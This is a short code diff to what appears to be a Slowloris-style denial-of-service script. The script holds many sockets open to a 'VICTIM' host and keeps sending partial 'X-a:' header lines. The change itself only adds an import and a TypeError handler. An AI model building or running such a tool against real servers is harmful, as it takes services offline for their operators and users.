@@ -1,4 +1,5 @@
 import socket, time, argparse, sys, random
+from typing import Type
 from helper import *
 
 VICTIM, PORT, SOCKET_COUNT = None, None, None
@@ -64,6 +65,8 @@ def main():
             for s in sockets:
                 try:
                     send_data(s, f"X-a: {random.randint(0, 10000)}") 
+                except TypeError as e:
+                    print(error(f"Error: {e}"))
                 except socket.error as e:
                     sockets.remove(s)
             
